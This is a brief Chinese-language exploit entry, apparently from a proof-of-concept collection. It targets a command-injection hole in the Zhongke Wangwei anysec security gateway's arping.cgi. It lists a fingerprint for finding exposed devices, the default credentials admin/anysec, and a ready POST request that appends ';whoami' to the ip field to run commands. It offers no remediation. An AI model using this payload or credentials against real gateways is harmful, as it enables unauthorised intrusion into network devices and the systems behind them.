# 中科网威anysec安全网关arping存在后台远程命令执行漏洞

- **系统**：中科网威anysec安全网关　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="中科网威-anysec"`
- **请求**：`POST /cgi-bin/system/arping.cgi HTTP/1.1`

**请求体 / payload**
```
使用弱口令admin/anysec登录系统
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
moduleid=150&tasknum=1&ip=127.0.0.1;whoami&interface=wan0&count=4&sip=8.8.8.8&x=58&y=16
```
- **预期**：200　|　—